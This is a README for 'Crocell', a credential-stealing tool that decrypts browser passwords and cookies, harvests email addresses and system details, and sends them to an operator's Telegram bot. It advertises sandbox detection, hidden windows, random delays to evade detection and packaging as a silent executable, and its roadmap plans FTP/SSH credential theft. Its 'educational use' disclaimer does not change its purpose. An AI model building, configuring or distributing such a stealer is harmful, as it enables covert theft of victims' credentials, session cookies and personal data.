# Paimon-
#this is the update of corecell project 

# 🐊 Crocell - Cross-Platform Browser Data Extractor

[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-blue)]()
[![Python](https://img.shields.io/badge/python-3.8%2B-green)]()
[![License](https://img.shields.io/badge/license-Educational-yellow)]()

**Comprehensive, cross-platform browser data extraction tool with Firefox support.**

## ✨ Features

### 🌐 **Multi-Browser Support**
- ✅ **Chromium-based**: Chrome, Edge, Brave, Opera, Vivaldi, Chromium
- ✅ **Firefox**: Full Firefox support with cookie and password extraction
- ✅ **Cross-Platform**: Windows, Linux, and macOS

### 🔑 **Password Extraction**
- Chromium v10/v11/v20 encryption support
- Firefox logins.json parsing
- Multi-profile support (Default, Profile 1, etc.)
- Separates decrypted vs encrypted passwords

### 🍪 **Cookie Extraction**
- Session cookies identification
- Persistent cookies with expiry dates
- Full cookie metadata (Secure, HttpOnly, SameSite flags)
- Domain-based organization

### 📧 **Email Extraction**
- Fast parallel file scanning
- Regex-based email detection
- Scans Documents, Downloads, Desktop
- Filters out test/example emails

### 💻 **System Information**
- CPU, Memory, Disk usage
- Network information (Public IP, MAC)
- Boot time tracking
- Cross-platform compatibility

### 🔒 **Security Features**
- **NO hardcoded credentials** - uses environment variables only
- Stealth mode (silent operation)
- VM/Sandbox detection
- Random delays to avoid detection
- Console window hiding on Windows

---

## 📦 Installation

### Prerequisites
- Python 3.8 or higher
- pip (Python package manager)

### Step 1: Clone or Download
```bash
git clone https://github.com/yourusername/crocell.git
cd crocell
```

### Step 2: Install Dependencies
```bash
pip install -r requirements.txt
```

**Dependencies:**
- `requests` - HTTP communication
- `pycryptodome` - Encryption/decryption
- `psutil` - System information
- `pywin32` - Windows-specific (Windows only)

---

## 🚀 Usage

### Method 1: Run Python Script Directly

#### Set Environment Variables

**Linux/macOS:**
```bash
export CROCELL_BOT_TOKEN="your_telegram_bot_token"
export CROCELL_CHAT_ID="your_telegram_chat_id"
```

**Windows (Command Prompt):**
```cmd
set CROCELL_BOT_TOKEN=your_telegram_bot_token
set CROCELL_CHAT_ID=your_telegram_chat_id
```

**Windows (PowerShell):**
```powershell
$env:CROCELL_BOT_TOKEN="your_telegram_bot_token"
$env:CROCELL_CHAT_ID="your_telegram_chat_id"
```

#### Run the Script
```bash
python crocell_cross_platform.py
```

---

### Method 2: Build Standalone Executable

#### Step 1: Install PyInstaller
```bash
pip install pyinstaller
```

#### Step 2: Build Executable
```bash
python build.py
```

This creates:
- **Windows**: `dist/crocell.exe`
- **Linux/macOS**: `dist/crocell`

#### Step 3: Set Environment Variables & Run

**Linux/macOS:**
```bash
export CROCELL_BOT_TOKEN="your_token"
export CROCELL_CHAT_ID="your_chat_id"
./dist/crocell
```

**Windows:**
```cmd
set CROCELL_BOT_TOKEN=your_token
set CROCELL_CHAT_ID=your_chat_id
dist\crocell.exe
```

---

## 🔧 Configuration

### Environment Variables

| Variable | Required | Description | Example |
|----------|----------|-------------|---------|
| `CROCELL_BOT_TOKEN` | ✅ Yes | Telegram Bot API token | `123456:ABC-DEF...` |
| `CROCELL_CHAT_ID` | ✅ Yes | Telegram chat ID | `123456789` |
| `CROCELL_EXTRACT_PASSWORDS` | ❌ No | Extract passwords (default: true) | `true` / `false` |
| `CROCELL_EXTRACT_COOKIES` | ❌ No | Extract cookies (default: true) | `true` / `false` |
| `CROCELL_MAX_RETRIES` | ❌ No | Telegram retry attempts (default: 3) | `3` |
| `CROCELL_TELEGRAM_TIMEOUT` | ❌ No | Request timeout in seconds (default: 30) | `30` |

### How to Get Telegram Credentials

1. **Create a Telegram Bot:**
   - Open Telegram and search for `@BotFather`
   - Send `/newbot` and follow instructions
   - Copy the bot token (looks like `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

2. **Get Your Chat ID:**
   - Start a chat with your new bot
   - Send any message to the bot
   - Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
   - Look for `"chat":{"id":123456789}` in the response

---

## 📊 Output Format

### JSON Report Structure
```json
{
  "timestamp": "2026-02-10T10:30:00",
  "system": {
    "os": "Windows 11",
    "platform": "Windows",
    "hostname": "DESKTOP-ABC123",
    "system_user": "john"
  },
  "passwords_by_browser": {
    "Chrome": {
      "total": 50,
      "decrypted_count": 45,
      "encrypted_count": 5,
      "decrypted_passwords": [
        {
          "browser": "Chrome",
          "profile": "",
          "url": "https://github.com",
          "username": "user@example.com",
          "password": "decrypted_password"
        }
      ]
    },
    "Firefox": {
      "decrypted_passwords": [...]
    }
  },
  "cookies_by_browser": {
    "Chrome": {
      "total": 500,
      "session_count": 150,
      "persistent_count": 350,
      "session_cookies": [
        {
          "browser": "Chrome",
          "host": ".youtube.com",
          "name": "VISITOR_INFO1_LIVE",
          "value": "cookie_value",
          "is_session": true
        }
      ]
    }
  },
  "emails": ["user1@example.com", "user2@example.com"],
  "summary": {
    "total_passwords": 100,
    "total_cookies": 800,
    "browsers_found": ["Chrome", "Firefox", "Edge"]
  }
}
```

---

## 🖥️ Platform-Specific Notes

### Windows
- ✅ Full support for all features
- ✅ Console window hiding
- ✅ DPAPI decryption support
- ⚠️ Requires `pywin32` package

### Linux
- ✅ Full Chromium support
- ✅ Firefox support
- ℹ️ Uses "peanuts" password for Chrome decryption
- ℹ️ Some Chromium passwords may remain encrypted

### macOS
- ✅ Full Chromium support
- ✅ Firefox support
- ✅ Keychain password retrieval attempt
- ℹ️ May require additional permissions

---

## 🛠️ Troubleshooting

### "Configuration error" - Missing credentials
**Problem:** Environment variables not set
**Solution:** Set `CROCELL_BOT_TOKEN` and `CROCELL_CHAT_ID` before running

### No passwords extracted
**Problem:** Browser not detected or wrong paths
**Solution:** Check if browsers are installed in standard locations

### "Permission denied" errors
**Problem:** No file access permissions
**Solution:** Run with appropriate permissions (may need admin/sudo on some systems)

### Telegram send fails
**Problem:** Invalid bot token or chat ID
**Solution:** Verify credentials, check internet connection

### Firefox passwords show [ENCRYPTED]
**Problem:** Firefox master password or complex encryption
**Solution:** This is expected - full NSS decryption requires master password

---

## 📝 PyInstaller Build Options

### Basic Build (Current)
```bash
python build.py
```
Output: Single executable file

### Advanced Build Options

**Add Custom Icon (Windows):**
```python
# In build.py, modify cmd.extend():
cmd.extend([
    "--noconsole",
    "--icon=icon.ico",  # Add your icon file
])
```

**Reduce File Size:**
```python
cmd.extend([
    "--onefile",
    "--strip",              # Strip debug symbols (Linux/Mac)
    "--noupx",              # Don't use UPX compression
])
```

**Include Additional Files:**
```python
cmd.extend([
    "--add-data=config.json:.",  # Include config file
])
```

---

## ⚠️ Legal Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY**

This tool is provided for:
- ✅ Educational purposes
- ✅ Authorized security testing
- ✅ Personal data backup
- ✅ Forensic analysis with proper authorization

**Unauthorized use is illegal and may result in:**
- Criminal prosecution under CFAA (Computer Fraud and Abuse Act)
- GDPR violations and fines
- Civil lawsuits
- Criminal charges

**Always:**
- Obtain explicit written permission before testing
- Comply with local laws and regulations
- Use ethically and responsibly

---

## 🔍 Technical Details

### Supported Browsers

| Browser | Windows | Linux | macOS | Passwords | Cookies |
|---------|---------|-------|-------|-----------|---------|
| Chrome | ✅ | ✅ | ✅ | ✅ | ✅ |
| Firefox | ✅ | ✅ | ✅ | ✅ | ✅ |
| Edge | ✅ | ❌ | ✅ | ✅ | ✅ |
| Brave | ✅ | ✅ | ✅ | ✅ | ✅ |
| Opera | ✅ | ✅ | ✅ | ✅ | ✅ |
| Vivaldi | ✅ | ✅ | ✅ | ✅ | ✅ |

### Encryption Support
- **Chromium v10/v11/v20**: AES-GCM decryption
- **Windows DPAPI**: Legacy encryption
- **Linux/Mac**: PBKDF2 with "peanuts" password
- **Firefox**: Basic logins.json parsing

### File Locations

**Windows:**
- Chromium: `%LOCALAPPDATA%\Google\Chrome\User Data`
- Firefox: `%APPDATA%\Mozilla\Firefox\Profiles`

**Linux:**
- Chromium: `~/.config/google-chrome`
- Firefox: `~/.mozilla/firefox`

**macOS:**
- Chromium: `~/Library/Application Support/Google/Chrome`
- Firefox: `~/Library/Application Support/Firefox/Profiles`

---

## 🤝 Contributing

Contributions are welcome! Areas for improvement:
- Enhanced Firefox NSS decryption
- Safari support (macOS)
- Additional browser support
- Performance optimizations
- Better error handling

---

## 📜 License

This project is provided for **educational purposes only**.

By using this software, you agree to:
1. Use it only on systems you own or have explicit permission to test
2. Comply with all applicable laws and regulations
3. Take full responsibility for your actions

---

## 📧 Support

For issues or questions:
1. Check the [Troubleshooting](#-troubleshooting) section
2. Review [Technical Details](#-technical-details)
3. Open an issue on GitHub (if applicable)

---

## 🎯 Roadmap

- [ ] Full Firefox NSS decryption with master password support
- [ ] Safari keychain extraction (macOS)
- [ ] Browser history extraction
- [ ] FTP/SSH credential extraction (FileZilla, WinSCP)
- [ ] Improved anti-detection features
- [ ] GUI interface

---

**Made with 🐊 by the Crocell Team**
